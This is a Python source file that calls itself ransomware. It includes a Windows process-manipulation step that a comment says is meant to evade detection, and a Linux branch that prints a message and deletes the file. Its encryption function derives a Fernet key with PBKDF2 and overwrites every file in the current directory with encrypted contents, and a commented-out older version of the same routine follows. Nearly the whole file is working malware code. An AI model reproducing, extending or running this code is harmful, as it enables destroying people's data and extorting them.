# import libraries
import os
from cryptography.fernet import Fernet
import platform
import psutil
import random
import subprocess
import win32api
import win32con
import win32process
import time
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
import base64
import hashlib


sys = platform.system()                                                                                                                             # Basic os detection. Maybe I'll improve later, but that'll do.

if sys == "Windows":
    # process manipulation for complicate the detection
    process_list = list(psutil.process_iter())                                                                                                      # Agglomerate all processes to process_list variable
    process_select = random.choice(process_list)                                                                                                    # Select a random process from pid_list variable
    pid_select = process_select.pid                                                                                                                 # Select the PID from selected process
    file_name = __file__                                                                                                                            # Take the name of the file

    h_process = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False , pid_select)                                                               # Open the selected PID and take the full access
    h_thread, tid, pid, tid = win32process.CreateProcess(None, f"python {file_name}", None, None, False, 0, None, None, win32process.STARTUPINFO()) # Create a new process for our file, obstruct to create a new process for our process, start the process in default priority, no directory and startupinfo for the process

if sys == "Linux":
    file = __file__                                                                                                                                 # Take the name of the file
    wait_time = 60                                                                                                                                  # Declare 60 seconds 
    for i in range(wait_time, 0, -1):                                                                                                               # For loop to display the message below for 60 seconds
        print(f"This is a ransomware just working on Windows systems. I respect a lot for Linux, so this malware will delete itself from your system in {i} seconds... LONG LIVE LINUX!")                                                         
        time.sleep(1)

    print(f"{file} File has been deleted with no residues.")                                                                                        # One last message
    os.remove(file)                                                                                                                                 # Remove 


def encryption():
    file_list = []

    for file in os.listdir():                                                                                                                       # listing every file in it's directory except required files and itself (testing phase)
        if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
            continue
        if os.path.isfile(file):
            file_list.append(file)

    print(file_list)    

    
    salt = os.urandom(16)                                                                                                                           # Generate a random salt for randomize the key
    password = b"password"                                                                                                                          # Define a password for "Password Based Key Derivation Function" library
    kdf = PBKDF2HMAC(                                                                                                                               # Key derivation function, 
        algorithm=hashes.SHA512(),                                                                                                                  # SHA512 hashing
        iterations=100000,                                                                                                                          # Iteration number for key
        salt=salt,                                                                                                                                  # Salt variable into salt parameter
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))                                                                                            # Derivation of the key

    print(key)                                                                                                                                      # Print the key (testing phase)

    with open("generatedkey.key", "wb") as generatedkey:                                                                                            # Write key to generated.key file (testing phase)
        generatedkey.write(key)

    for file in file_list:                                                                                                                          # Crypting part
        with open(file, "rb") as the_file:                                                                                                          # Activate reading mode for all files
            contents = the_file.read()                                                                                                              # Read files
            cipher_suite = Fernet(key)                                                                                                              # Take tke key variable with fernet as cipher_suite
            contents_encrypted = cipher_suite.encrypt(contents)                                                                                     # Encryption
            with open(file, "wb") as the_file:                                                                                                      # Activate writing mode for files
                the_file.write(contents_encrypted)                                                                                                  # Write encrypted contents to files


''' OLD ENCRYPTION METHOD (WEAK)
file_list = []                                                                                                          

for file in os.listdir():                                                                                                                           # crypting function, just crypts it's directory except itself for testing phase
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        file_list.append(file)

print(file_list)                                                                                                                                    # testing phase

key = Fernet.generate_key()                                                                                                                         # generates a crpyting key using fernet which is weak, might have been upgraded to sha256 & sha512 in the future

print(key)                                                                                                                                          # testing phase

with open("generatedkey.key", "wb") as generatedkey:                                                                                                # testing phase
    generatedkey.write(key)

for file in file_list:                                                                                                                              # usual crypting function of fernet library that I use, nothing special 
    with open(file, "rb") as the_file:
        contents = the_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted)
'''
